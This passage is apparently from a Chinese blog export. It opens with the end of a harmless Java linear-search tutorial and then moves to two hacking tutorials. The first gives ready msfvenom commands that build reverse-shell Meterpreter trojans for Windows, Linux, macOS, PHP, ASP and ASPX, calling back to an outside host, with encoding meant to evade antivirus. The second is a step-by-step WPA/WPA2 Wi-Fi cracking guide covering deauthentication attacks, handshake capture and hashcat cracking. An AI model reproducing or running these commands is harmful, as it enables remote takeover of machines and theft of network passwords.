students = &#123;<span class="keyword">new</span> Student(<span class="string">"Alice"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Bob"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Charles"</span>)&#125;;</span><br><span class="line">        Student bob = <span class="keyword">new</span> Student(<span class="string">"bOb"</span>); <span class="comment">//不区分大小写</span></span><br><span class="line">        <span class="keyword">int</span> res3 = LinearSearch.search(students, bob);</span><br><span class="line">        System.out.println(res3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Student-java"><a href="#Student-java" class="headerlink" title="Student.java"></a>Student.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="comment">//以下代码可不需要-----------------------------</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object student)</span></span>&#123; <span class="comment">//student是Object的对象</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span> == student) <span class="comment">//判断对象是否等于student</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(student == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.getClass() != student.getClass()) <span class="comment">//当前的类对象是否等于object这个student类对象</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        Student another = (Student)student; <span class="comment">//将student转换为Student 进行覆盖</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name.toLowerCase().equals(another.name.toLowerCase()); <span class="comment">//toLowerCase转小写，进行不区分大小写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624052355565.png" alt="image-20210624052355565"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624111001209.png" alt="image-20210624111001209"></p>
<h1 id="线性查找算法运行结果截图"><a href="#线性查找算法运行结果截图" class="headerlink" title="线性查找算法运行结果截图"></a>线性查找算法运行结果截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624133647027.png" alt="image-20210624133647027"></p>
<h1 id="线性查找法算法时间测试"><a href="#线性查找法算法时间测试" class="headerlink" title="线性查找法算法时间测试"></a>线性查找法算法时间测试</h1><h2 id="LinearSearch-java-1"><a href="#LinearSearch-java-1" class="headerlink" title="LinearSearch.java"></a>LinearSearch.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinearSearch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LinearSearch</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(E[] data, E target)</span></span>&#123; <span class="comment">//泛型方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(target)) <span class="comment">//equals用于值相等，尽量不写==</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] dataSize = &#123;<span class="number">10000000</span>,<span class="number">100000000</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> n: dataSize) &#123;</span><br><span class="line">            Integer[] data = ArrayGenerator.generateOrderedArray(n); <span class="comment">//手动修改数组类型</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">                LinearSearch.search(data, n);  <span class="comment">//自动转换泛型类，数组型不能</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line">            <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//单位是纳秒 浮点数加零 计算时间复杂 可以判断算法性能</span></span><br><span class="line">            System.out.println(<span class="string">"n ="</span> + n + <span class="string">", 1000 runs :"</span> + time + <span class="string">" s"</span>); <span class="comment">//打印出花费时间</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        int res2 = LinearSearch.search(data, 666);</span></span><br><span class="line"><span class="comment">//        System.out.println(res2);</span></span><br><span class="line"></span><br><span class="line">        Student[] students = &#123;<span class="keyword">new</span> Student(<span class="string">"Alice"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Bob"</span>),</span><br><span class="line">                              <span class="keyword">new</span> Student(<span class="string">"Charles"</span>)&#125;;</span><br><span class="line">        Student bob = <span class="keyword">new</span> Student(<span class="string">"bOb"</span>); <span class="comment">//不区分大小写</span></span><br><span class="line">        <span class="keyword">int</span> res3 = LinearSearch.search(students, bob);</span><br><span class="line">        System.out.println(res3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【后门攻击】后门生成模块免杀</title>
    <url>/posts/34.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="从后面生成模块到权限维持基本命令"><a href="#从后面生成模块到权限维持基本命令" class="headerlink" title="从后面生成模块到权限维持基本命令"></a>从后面生成模块到权限维持基本命令</h1><blockquote>
<ul>
<li><h2 id="命令参数解释"><a href="#命令参数解释" class="headerlink" title="命令参数解释"></a>命令参数解释</h2><ul>
<li><h3 id="p、-payload-指定payload"><a href="#p、-payload-指定payload" class="headerlink" title="-p、-payload 指定payload"></a>-p、-payload 指定payload</h3></li>
<li><h3 id="–list-payloads-列出可以设置的payload选项"><a href="#–list-payloads-列出可以设置的payload选项" class="headerlink" title="–list payloads 列出可以设置的payload选项"></a>–list payloads 列出可以设置的payload选项</h3></li>
<li><h3 id="l、-list-列出可用项"><a href="#l、-list-列出可用项" class="headerlink" title="-l、-list 列出可用项"></a>-l、-list 列出可用项</h3></li>
<li><h3 id="n-指定nop在payload的数量"><a href="#n-指定nop在payload的数量" class="headerlink" title="-n 指定nop在payload的数量"></a>-n 指定nop在payload的数量</h3></li>
<li><h3 id="f-指定文件输出格式"><a href="#f-指定文件输出格式" class="headerlink" title="-f 指定文件输出格式"></a>-f 指定文件输出格式</h3></li>
<li><h3 id="–list-formats-列出可用输出格式"><a href="#–list-formats-列出可用输出格式" class="headerlink" title="–list formats 列出可用输出格式"></a>–list formats 列出可用输出格式</h3></li>
<li><h3 id="e、-encoder-指定使用编码器"><a href="#e、-encoder-指定使用编码器" class="headerlink" title="e、-encoder 指定使用编码器"></a>e、-encoder 指定使用编码器</h3></li>
<li><h3 id="–list-encoders-查看可用的编码器"><a href="#–list-encoders-查看可用的编码器" class="headerlink" title="–list encoders 查看可用的编码器"></a>–list encoders 查看可用的编码器</h3></li>
<li><h3 id="a，–arch-指定目标系统架构"><a href="#a，–arch-指定目标系统架构" class="headerlink" title="-a，–arch 指定目标系统架构"></a>-a，–arch 指定目标系统架构</h3></li>
<li><h3 id="–platform-指定目标系统"><a href="#–platform-指定目标系统" class="headerlink" title="–platform 指定目标系统"></a>–platform 指定目标系统</h3></li>
<li><h3 id="–list-platform-查看可用的目标系统"><a href="#–list-platform-查看可用的目标系统" class="headerlink" title="–list platform 查看可用的目标系统"></a>–list platform 查看可用的目标系统</h3></li>
<li><h3 id="s-未经编码的payload的最大长度"><a href="#s-未经编码的payload的最大长度" class="headerlink" title="-s 未经编码的payload的最大长度"></a>-s 未经编码的payload的最大长度</h3></li>
<li><h3 id="–encoder-space-编码后的payload最大长度"><a href="#–encoder-space-编码后的payload最大长度" class="headerlink" title="–encoder-space  编码后的payload最大长度"></a>–encoder-space <length> 编码后的payload最大长度</h3></li>
<li><h3 id="b-设置在paylaod中避免出现的字符"><a href="#b-设置在paylaod中避免出现的字符" class="headerlink" title="-b 设置在paylaod中避免出现的字符"></a>-b 设置在paylaod中避免出现的字符</h3></li>
<li><h3 id="i-设置payload的编码次数"><a href="#i-设置payload的编码次数" class="headerlink" title="-i 设置payload的编码次数"></a>-i 设置payload的编码次数</h3></li>
<li><h3 id="c-、–add-code-包含额外的win32-shellcode文件"><a href="#c-、–add-code-包含额外的win32-shellcode文件" class="headerlink" title="-c 、–add-code 包含额外的win32 shellcode文件"></a>-c 、–add-code 包含额外的win32 shellcode文件</h3></li>
<li><h3 id="x、–template-指定特定可执行文件作为模板"><a href="#x、–template-指定特定可执行文件作为模板" class="headerlink" title="-x、–template 指定特定可执行文件作为模板"></a>-x、–template 指定特定可执行文件作为模板</h3></li>
<li><h3 id="k、–keep-保护模板的功能、注入的payload作为-一个新的进程运行"><a href="#k、–keep-保护模板的功能、注入的payload作为-一个新的进程运行" class="headerlink" title="-k、–keep 保护模板的功能、注入的payload作为 一个新的进程运行"></a>-k、–keep 保护模板的功能、注入的payload作为 一个新的进程运行</h3></li>
<li><h3 id="o-保存paylaod到文件"><a href="#o-保存paylaod到文件" class="headerlink" title="-o 保存paylaod到文件"></a>-o 保存paylaod到文件</h3></li>
<li><h3 id="v-指定变量名"><a href="#v-指定变量名" class="headerlink" title="-v 指定变量名"></a>-v 指定变量名</h3></li>
</ul>
</li>
</ul>
</blockquote>
<p>ad39402345.wicp.vip:26240</p>
<h1 id="常见后门生成方式"><a href="#常见后门生成方式" class="headerlink" title="常见后门生成方式"></a>常见后门生成方式</h1><blockquote>
<ul>
<li><h2 id="一、windows"><a href="#一、windows" class="headerlink" title="一、windows"></a>一、windows</h2><ul>
<li><h3 id="命令：msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-exe-o-木马名称-exe"><a href="#命令：msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-exe-o-木马名称-exe" class="headerlink" title="命令：msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f exe -o 木马名称.exe"></a>命令：msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f exe -o 木马名称.exe</h3></li>
<li><h3 id="msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-e-x86-shikata-ga-nai-i-3-f-exe-o-木马名称-exe"><a href="#msfvenom-a-x64-–platform-Windows-p-windows-x64-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-e-x86-shikata-ga-nai-i-3-f-exe-o-木马名称-exe" class="headerlink" title="msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -e x86/shikata_ga_nai -i 3 -f exe -o 木马名称.exe"></a>msfvenom -a x64 –platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -e x86/shikata_ga_nai -i 3 -f exe -o 木马名称.exe</h3></li>
</ul>
</li>
<li><h2 id="二、Linux"><a href="#二、Linux" class="headerlink" title="二、Linux"></a>二、Linux</h2><ul>
<li><h3 id="msfvenom-p-linux-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-elf-o-木马名称-elf"><a href="#msfvenom-p-linux-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-elf-o-木马名称-elf" class="headerlink" title="msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f elf -o 木马名称.elf"></a>msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f elf -o 木马名称.elf</h3></li>
</ul>
</li>
<li><h2 id="三、MAC"><a href="#三、MAC" class="headerlink" title="三、MAC"></a>三、MAC</h2><ul>
<li><h3 id="msfvenom-p-osx-x86-shell-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-macho-o-木马名称-macho"><a href="#msfvenom-p-osx-x86-shell-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-macho-o-木马名称-macho" class="headerlink" title="msfvenom -p osx/x86/shell_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f macho -o 木马名称.macho"></a>msfvenom -p osx/x86/shell_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f macho -o 木马名称.macho</h3></li>
</ul>
</li>
<li><h2 id="四、PHP"><a href="#四、PHP" class="headerlink" title="四、PHP"></a>四、PHP</h2><ul>
<li><h3 id="msfvenom-p-php-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-raw-o-木马名称-php"><a href="#msfvenom-p-php-x86-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-raw-o-木马名称-php" class="headerlink" title="msfvenom -p php/x86/meterpreter_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f raw -o 木马名称.php"></a>msfvenom -p php/x86/meterpreter_reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f raw -o 木马名称.php</h3></li>
</ul>
</li>
<li><h2 id="五、ASP"><a href="#五、ASP" class="headerlink" title="五、ASP"></a>五、ASP</h2><ul>
<li><h3 id="msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-asp-o-木马名称-asp"><a href="#msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-asp-o-木马名称-asp" class="headerlink" title="msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f asp -o 木马名称.asp"></a>msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f asp -o 木马名称.asp</h3></li>
</ul>
</li>
<li><h2 id="六、ASPX"><a href="#六、ASPX" class="headerlink" title="六、ASPX"></a>六、ASPX</h2><ul>
<li><h3 id="msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-aspx-o-木马名称-aspx"><a href="#msfvenom-p-windows-meterpreter-reverse-tcp-LHOST-free-idcfengye-com-LPORT-10030-f-aspx-o-木马名称-aspx" class="headerlink" title="msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f aspx -o 木马名称.aspx"></a>msfvenom -p windows/meterpreter/reverse_tcp  LHOST=free.idcfengye.com LPORT=10030 -f aspx -o 木马名称.aspx</h3></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞工具</tag>
        <tag>免杀</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【嗅探工具】无线WIFI密码破解</title>
    <url>/posts/33.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>本文仅介绍通过抓取握手包的方式破解WPA/WPA2的密码，用到的工具是Kali Linux自带的airmon-ng，以及地表最强密码破解工具hashcat（可选）。</li>
</ul>
</blockquote>
<h1 id="Aircrack-ng破解wifi使用的几个套件"><a href="#Aircrack-ng破解wifi使用的几个套件" class="headerlink" title="Aircrack-ng破解wifi使用的几个套件"></a>Aircrack-ng破解wifi使用的几个套件</h1><blockquote>
<ul>
<li><h2 id="aircrack-ng-破解WEP以及WPA（字典攻击）密钥"><a href="#aircrack-ng-破解WEP以及WPA（字典攻击）密钥" class="headerlink" title="aircrack-ng 破解WEP以及WPA（字典攻击）密钥"></a>aircrack-ng 破解WEP以及WPA（字典攻击）密钥</h2></li>
<li><h2 id="airdecap-ng-通过已知密钥来解密WEP或WPA嗅探数据"><a href="#airdecap-ng-通过已知密钥来解密WEP或WPA嗅探数据" class="headerlink" title="airdecap-ng 通过已知密钥来解密WEP或WPA嗅探数据"></a>airdecap-ng 通过已知密钥来解密WEP或WPA嗅探数据</h2></li>
<li><h2 id="airmon-ng-将网卡设定为监听模式"><a href="#airmon-ng-将网卡设定为监听模式" class="headerlink" title="airmon-ng 将网卡设定为监听模式"></a>airmon-ng 将网卡设定为监听模式</h2></li>
<li><h2 id="aireplay-ng-数据包注入工具"><a href="#aireplay-ng-数据包注入工具" class="headerlink" title="aireplay-ng 数据包注入工具"></a>aireplay-ng 数据包注入工具</h2></li>
<li><h2 id="airodump-ng-数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息"><a href="#airodump-ng-数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息" class="headerlink" title="airodump-ng 数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息"></a>airodump-ng 数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息</h2></li>
</ul>
</blockquote>
<h1 id="WIFI破解配置要求"><a href="#WIFI破解配置要求" class="headerlink" title="WIFI破解配置要求"></a>WIFI破解配置要求</h1><blockquote>
<ul>
<li><h2 id="自建WIFI进行测试"><a href="#自建WIFI进行测试" class="headerlink" title="自建WIFI进行测试"></a>自建WIFI进行测试</h2></li>
<li><h2 id="外置网卡设备具备监听（RT5370）"><a href="#外置网卡设备具备监听（RT5370）" class="headerlink" title="外置网卡设备具备监听（RT5370）"></a>外置网卡设备具备监听（RT5370）</h2></li>
<li><h2 id="信号稳定"><a href="#信号稳定" class="headerlink" title="信号稳定"></a>信号稳定</h2></li>
</ul>
</blockquote>
<h1 id="WIFI破解的流程-第一种情况密码简单"><a href="#WIFI破解的流程-第一种情况密码简单" class="headerlink" title="WIFI破解的流程-第一种情况密码简单"></a>WIFI破解的流程-第一种情况密码简单</h1><blockquote>
<ul>
<li><h2 id="一、插上网卡，查看是否已接入kali虚拟机"><a href="#一、插上网卡，查看是否已接入kali虚拟机" class="headerlink" title="一、插上网卡，查看是否已接入kali虚拟机"></a>一、插上网卡，查看是否已接入kali虚拟机</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621175921359.png" alt="image-20210621175921359"></li>
</ul>
</li>
<li><h2 id="二、使用airmon-ng套件查看网卡是否具备监听功能"><a href="#二、使用airmon-ng套件查看网卡是否具备监听功能" class="headerlink" title="二、使用airmon-ng套件查看网卡是否具备监听功能"></a>二、使用airmon-ng套件查看网卡是否具备监听功能</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621180025457.png" alt="image-20210621180025457"></li>
</ul>
</li>
<li><h2 id="三、开启无线网卡监控模式"><a href="#三、开启无线网卡监控模式" class="headerlink" title="三、开启无线网卡监控模式"></a>三、开启无线网卡监控模式</h2><ul>
<li><h3 id="命令：airmon-ng-start-wlan0"><a href="#命令：airmon-ng-start-wlan0" class="headerlink" title="命令：airmon-ng start wlan0"></a>命令：airmon-ng start wlan0</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621180326463.png" alt="image-20210621180326463"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621180352819.png" alt="image-20210621180352819"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="四、查看周围WIFI网络"><a href="#四、查看周围WIFI网络" class="headerlink" title="四、查看周围WIFI网络"></a>四、查看周围WIFI网络</h2><ul>
<li><h3 id="命令：airodump-ng-wlan0mon"><a href="#命令：airodump-ng-wlan0mon" class="headerlink" title="命令：airodump-ng wlan0mon"></a>命令：airodump-ng wlan0mon</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621181347840.png" alt="image-20210621181347840"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621181910481.png" alt="image-20210621181910481"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="五、监听目标网络的握手包"><a href="#五、监听目标网络的握手包" class="headerlink" title="五、监听目标网络的握手包"></a>五、监听目标网络的握手包</h2><ul>
<li><h3 id="命令：airodump-ng-c-7-–bssid-46-BC-5E-47-6A-2C-w-1-wlan0mon-注意：-w是写入的文件的位置"><a href="#命令：airodump-ng-c-7-–bssid-46-BC-5E-47-6A-2C-w-1-wlan0mon-注意：-w是写入的文件的位置" class="headerlink" title="命令：airodump-ng -c 7 –bssid 46:BC:5E:47:6A:2C -w ~/1/ wlan0mon (注意：-w是写入的文件的位置)"></a>命令：airodump-ng -c 7 –bssid 46:BC:5E:47:6A:2C -w ~/1/ wlan0mon (注意：-w是写入的文件的位置)</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621182329759.png" alt="image-20210621182329759"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621183324950.png" alt="image-20210621183324950"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="六、强制对方wifi断开重连（获取握手包）开起一个新窗口"><a href="#六、强制对方wifi断开重连（获取握手包）开起一个新窗口" class="headerlink" title="六、强制对方wifi断开重连（获取握手包）开起一个新窗口"></a>六、强制对方wifi断开重连（获取握手包）开起一个新窗口</h2><ul>
<li><blockquote>
<ul>
<li><h4 id="0-表示发起（鉴权）deauthentication攻击"><a href="#0-表示发起（鉴权）deauthentication攻击" class="headerlink" title="-0 表示发起（鉴权）deauthentication攻击"></a>-0 表示发起（鉴权）deauthentication攻击</h4></li>
<li><h4 id="a-指定无限路由器BSSID"><a href="#a-指定无限路由器BSSID" class="headerlink" title="-a 指定无限路由器BSSID"></a>-a 指定无限路由器BSSID</h4></li>
<li><h3 id="c-指定强制断开的设备"><a href="#c-指定强制断开的设备" class="headerlink" title="-c 指定强制断开的设备"></a>-c 指定强制断开的设备</h3></li>
</ul>
</blockquote>
</li>
<li><h3 id="命令：aireplay-ng-0-50-a-46-BC-5E-47-6A-2C-c-22-4D-0E-6F-48-73-wlan0mon"><a href="#命令：aireplay-ng-0-50-a-46-BC-5E-47-6A-2C-c-22-4D-0E-6F-48-73-wlan0mon" class="headerlink" title="命令：aireplay-ng -0 50 -a 46:BC:5E:47:6A:2C -c 22:4D:0E:6F:48:73 wlan0mon"></a>命令：aireplay-ng -0 50 -a 46:BC:5E:47:6A:2C -c 22:4D:0E:6F:48:73 wlan0mon</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621184525963.png" alt="image-20210621184525963"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621184557289.png" alt="image-20210621184557289"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621184858614.png" alt="image-20210621184858614"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="七、破解握手包密码"><a href="#七、破解握手包密码" class="headerlink" title="七、破解握手包密码"></a>七、破解握手包密码</h2><ul>
<li><blockquote>
<ul>
<li><h4 id="a2代表WPA的握手包"><a href="#a2代表WPA的握手包" class="headerlink" title="-a2代表WPA的握手包"></a>-a2代表WPA的握手包</h4></li>
<li><h4 id="b指定要破解的wifi-BSSID"><a href="#b指定要破解的wifi-BSSID" class="headerlink" title="-b指定要破解的wifi BSSID"></a>-b指定要破解的wifi BSSID</h4></li>
<li><h4 id="w-指定字典文件"><a href="#w-指定字典文件" class="headerlink" title="-w 指定字典文件"></a>-w 指定字典文件</h4></li>
<li><h4 id="最后是抓取的包"><a href="#最后是抓取的包" class="headerlink" title="最后是抓取的包"></a>最后是抓取的包</h4></li>
</ul>
</blockquote>
</li>
<li><h3 id="命令-aircrack-ng-a2-b-46-BC-5E-47-6A-2C-w-1-txt-1-cap"><a href="#命令-aircrack-ng-a2-b-46-BC-5E-47-6A-2C-w-1-txt-1-cap" class="headerlink" title="命令: aircrack-ng -a2 -b 46:BC:5E:47:6A:2C -w 1.txt ~/1/*.cap"></a>命令: aircrack-ng -a2 -b 46:BC:5E:47:6A:2C -w 1.txt ~/1/*.cap</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210621185111501.png" alt="image-20210621185111501"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解"><a href="#WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解" class="headerlink" title="WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解"></a>WIFI破解的流程-第二种情况密码复杂hashcat可以超速破解</h1><blockquote>
<ul>
<li><h2 id="一、延续上面抓到了包"><a href="#一、延续上面抓到了包" class="headerlink" title="一、延续上面抓到了包"></a>一、延续上面抓到了包</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210622105042874.png" alt="image-20210622105042874"></li>
</ul>
</li>
<li><h2 id="二、将cap转换为hashcat能够破解的形式"><a href="#二、将cap转换为hashcat能够破解的形式" class="headerlink" title="二、将cap转换为hashcat能够破解的形式"></a>二、将cap转换为hashcat能够破解的形式</h2><ul>
<li><h3 id="命令：aircrack-ng-root-1-cap-j-hashcat（将cap类型转换为hashcat可破解形式）"><a href="#命令：aircrack-ng-root-1-cap-j-hashcat（将cap类型转换为hashcat可破解形式）" class="headerlink" title="命令：aircrack-ng /root/1/*.cap -j hashcat（将cap类型转换为hashcat可破解形式）"></a>命令：aircrack-ng /root/1/*.cap -j hashcat（将cap类型转换为hashcat可破解形式）</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210622105538241.png" alt="image-20210622105538241"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="三、第一种形式是利用kali中生成的字典利用hashcat破解"><a href="#三、第一种形式是利用kali中生成的字典利用hashcat破解" class="headerlink" title="三、第一种形式是利用kali中生成的字典利用hashcat破解"></a>三、第一种形式是利用kali中生成的字典利用hashcat破解</h2><ul>
<li><h3 id="生成字典命令：crunch-8-8-0123456789-o-dic-txt"><a href="#生成字典命令：crunch-8-8-0123456789-o-dic-txt" class="headerlink" title="生成字典命令：crunch 8 8 0123456789 -o dic.txt"></a>生成字典命令：crunch 8 8 0123456789 -o dic.txt</h3></li>
<li><h3 id="第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字-o是生成dic-txt字典文件，生成纯数字字典有900M左右"><a href="#第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字-o是生成dic-txt字典文件，生成纯数字字典有900M左右" class="headerlink" title="第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字 -o是生成dic.txt字典文件，生成纯数字字典有900M左右"></a>第一个8是最小位数，第二8是最大位数，0123456789是字典中包含的数字 -o是生成dic.txt字典文件，生成纯数字字典有900M左右</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210622110024965.png" alt="image-20210622110024965"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="因为我kali-是虚拟机，所以我去自己电脑使用hashcat会更快一些"><a href="#因为我kali-是虚拟机，所以我去自己电脑使用hashcat会更快一些" class="headerlink" title="因为我kali 是虚拟机，所以我去自己电脑使用hashcat会更快一些"></a>因为我kali 是虚拟机，所以我去自己电脑使用hashcat会更快一些</h2></li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210622110305904.png" alt="image-20210622110305904"></p>
</li>
<li><h1 id="开始跑起"><a href="#开始跑起" class="headerlink" title="开始跑起"></a>开始跑起</h1><ul>
<li><h2 id="命令：hashcat-a-0-m-2500-hashcat-hccapx-dic-txt"><a href="#命令：hashcat-a-0-m-2500-hashcat-hccapx-dic-txt" class="headerlink" title="命令：hashcat -a 0 -m 2500 hashcat.hccapx dic.txt"></a>命令：hashcat -a 0 -m 2500 hashcat.hccapx dic.txt</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210622110454893.png" alt="image-20210622110454893"></li>
</ul>
</li>
</ul>
</li>
